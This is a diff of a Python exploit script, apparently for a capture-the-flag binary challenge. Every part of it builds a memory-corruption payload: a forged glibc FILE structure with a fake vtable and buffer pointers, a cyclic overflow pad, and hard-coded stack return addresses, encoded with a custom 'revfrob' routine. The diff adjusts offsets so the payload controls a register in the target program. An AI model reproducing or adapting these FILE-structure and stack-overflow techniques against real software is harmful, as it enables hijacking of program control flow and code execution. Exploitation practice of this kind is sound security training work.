@@ -27,12 +27,8 @@ def revfrob(s):
 def fake_file(writeaddr):
     #_flags = 0xfbad3484
     _flags = 0x0
-    _vtable = 0xf7f98580-16
+    _vtable = 0xf7f98580
     _lock = 0xffffd07d
-#  _flags           = -72534908,
-#  _IO_read_ptr     = 0x0,
-#  _IO_read_end     = 0x0,
-#  _IO_read_base    = 0x0,
     struct = p32(_flags)             #  _flags           
     struct += p32(0x0)               #  _IO_read_ptr   
     struct += p32(0x0)               #  _IO_read_end   
@@ -41,7 +37,7 @@ def fake_file(writeaddr):
     struct += p32(0x0)               #  _IO_write_ptr  
     struct += p32(0x0)               #  _IO_write_end  
     struct += p32(writeaddr)         #  _IO_buf_base   
-    struct += p32(writeaddr+8)       #  _IO_buf_end    
+    struct += p32(writeaddr+7)       #  _IO_buf_end    
     struct += p32(0x0)               #  _IO_save_base  
     struct += p32(0x0)               #  _IO_backup_base
     struct += p32(0x0)               #  _IO_save_end   
@@ -49,10 +45,10 @@ def fake_file(writeaddr):
     struct += p32(0x0)               #  _chain         
     struct += p32(0x0)               #  _fileno        
     struct += p32(0x0)               #  _flags2        
-    struct += p32(0x0)               #  _old_offset    
+    struct += ''                     #  _old_offset    
     struct += p32(0x0)               #  _cur_column    
     struct += p32(_vtable)           #  _vtable_offset 
-    struct += p32(0x0)               #  _shortbuf     
+    struct += ''                     #  _shortbuf     
     struct += p32(_lock)             #  _lock            
     struct += p64(0xfffffffffffff)   #  _offset 
     struct += p32(0x0)               #  __pad1           
@@ -61,9 +57,8 @@ def fake_file(writeaddr):
     struct += p32(0x0)               #  __pad4           
     struct += p32(0x0)               #  __pad5           
     struct += p32(0x0)               #  _mode            
-    for i in range(0, 40):
-        #struct += b'\xd0\xff\xff\x6d'#  _unused2
-        struct += p32(0x0) #  _unused2
+    struct += '\x00'*40              # _unused
+    struct += p32(_vtable)
 
     return struct
 
@@ -108,7 +103,7 @@ def fake_file(writeaddr):
 #  _unused2         = '\000' <repeats 39 times>
 #}
 
-writeloc = 0xffffd064
-print(revfrob(cyclic(272) + b'\x6c\xd0\xff\xff' + 'FAKEFILE=' + fake_file(writeloc) + b'\xff\xff\xdc\x09'))
+writeloc = 0xffffcf4c #need to push 0xffffd071 into eax at main+147
+print(revfrob(cyclic(248) + b'\x71\xd0\xff\xff' + b'k'*12 + b'\x64\xd0\xff\xff' + 'FAKEFILE=' + fake_file(writeloc) + b'\xff\xff\xdc\x09'))
 
 
